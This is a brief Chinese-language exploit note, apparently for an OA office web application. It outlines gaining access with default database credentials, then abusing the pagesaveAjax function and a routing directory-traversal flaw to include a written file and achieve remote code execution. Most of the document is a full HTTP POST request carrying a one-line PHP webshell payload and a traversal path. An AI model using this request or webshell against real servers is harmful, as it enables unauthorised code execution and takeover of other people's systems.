# ooaa
oa
利用数据库默认账号登陆
思路，写html文件，文件中写入php恶意代码

然后利用路由时的目录穿越漏洞进行文件包含造成rce、



关注函数pagesaveAjax
关注文件
/include/View.php


POST /index.php?a=pagesave&m=flow&d=main&ajaxbool=true HTTP/1.1
Host: localhost:8088
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0
.....
Referer: http://localhost:8088/
Cookie: ....

content=<?php $_GET[1]($_GET[2]);?>&num=/../../../../upload/2021-07/tpl_2021-07_iii
